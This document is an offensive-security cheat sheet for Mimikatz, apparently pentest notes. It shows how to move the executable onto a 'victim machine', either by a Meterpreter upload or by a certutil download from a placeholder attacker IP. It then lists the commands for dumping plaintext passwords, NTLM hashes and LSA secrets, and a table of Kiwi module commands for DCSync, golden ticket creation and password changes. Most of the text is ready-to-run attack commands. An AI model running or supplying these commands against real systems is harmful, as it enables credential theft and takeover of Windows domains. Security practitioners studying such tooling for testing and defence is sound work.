**Mimikatz** allows to extract sensitive data, such as plaintext passwords, password hashes, and Kerberos tickets, directly from a system's memory. Its capabilities, such as credential dumping, Pass-the-Hash, and Golden Ticket attacks, highlight weaknesses in Windows security.


## Transmit and Execute Mimikatz 

To run Mimikatz on a victim machine, you first need to transmit the Mimikatz executable to the machine.

#### Using Metasploit

```bash
cd C:\\Windows\\Temp\\
upload /usr/share/windows-resources/mimikatz/x64/ 
# Once uploaded, you can execute it through the Meterpreter session
execute -f C:\\Windows\\Temp\\mimikatz.exe
```

#### Using Python server

```bash
# Linux machine
python3 -m http.server 8000
# Windows machine
certutil -urlcache -f http://<attacker-ip>:<port>/mimikatz.exe mimikatz.exe
# Execute
start C:\Windows\Temp\mimikatz.exe
```

## **Enable Debug Privileges**

For Mimikatz to interact with Windows security processes like LSASS (Local Security Authority Subsystem Service), you must grant it the necessary privileges. This is done by enabling the `debug` privilege within Mimikatz:

```bash
privilege::debug
```


## **Dumping Credentials**

Mimikatz can dump various credentials, such as passwords, hashes, and Kerberos tickets, from memory. Below are the most common commands to extract these credentials:

1.  **Dumping Plaintext Passwords**

To dump all plaintext passwords and related information from the memory:

```bash
sekurlsa::logonpasswords
```

This command displays detailed information about the current user's session, including usernames, domain names, and plaintext passwords if available.

2.  **Dumping NTLM Hashes**

To extract NTLM hashes of users' passwords:

```bash
lsadump::sam
```

This dumps the hashes of local user accounts stored in the SAM (Security Account Manager) database.


3.  **Dumping secrets**

The `lsadump::secrets` command in Mimikatz is used to extract secrets (like password hashes, Kerberos keys, and other sensitive data) from the LSA (Local Security Authority) secrets database in Windows systems.

```bash
lsadump::secrets
```

## Dumping Credentials with Kiwi
The **Kiwi module** in Metasploit is a module based on the **mimikatz** tool and allows you to extract sensitive data, such as plaintext passwords, password hashes, and Kerberos tickets, from a compromised machine. Here's a breakdown of how to use it for dumping credentials.

#### Usage

In your Metasploit console, you need to load the `kiwi` module to interact with the victim machine’s memory.

```bash
load kiwi
```

Once you have gained the Meterpreter session you can execute the following commands:

|**Command**|**Description**|
|---|---|
|`creds_all`|Retrieve all credentials (parsed)|
|`creds_kerberos`|Retrieve Kerberos credentials (parsed)|
|`creds_msv`|Retrieve LM/NTLM credentials (parsed)|
|`creds_ssp`|Retrieve SSP credentials (parsed)|
|`creds_tspkg`|Retrieve TsPkg credentials (parsed)|
|`creds_wdigest`|Retrieve WDigest credentials (parsed)|
|`dcsycn`|Retrieve user account information via DCSync (unparsed)|
|`dcsycn_ntlm`|Retrieve user account NTLM hash, SID, and RID via DCSync (unparsed)|
|`golden_ticket_create`|Create a golden Kerberos ticket|
|`kerberos_ticket_list`|List all Kerberos tickets (unparsed)|
|`kerberos_ticket_purge`|Purge any in-use Kerberos tickets|
|`kerberos_ticket_use`|Use a Kerberos ticket|
|`kiwi_cmd`|Execute an arbitrary Mimikatz command (unparsed)|
|`lsa_dump_sam`|Dump LSA SAM (unparsed)|
|`lsa_dump_secrets`|Dump LSA secrets (unparsed)|
|`password_change`|Change the password/hash of a user|
|`wifi_list`|List WiFi profiles/credentials for the current user|
|`wifi_list_shared`|List shared WiFi profiles/credentials (requires SYSTEM privileges)|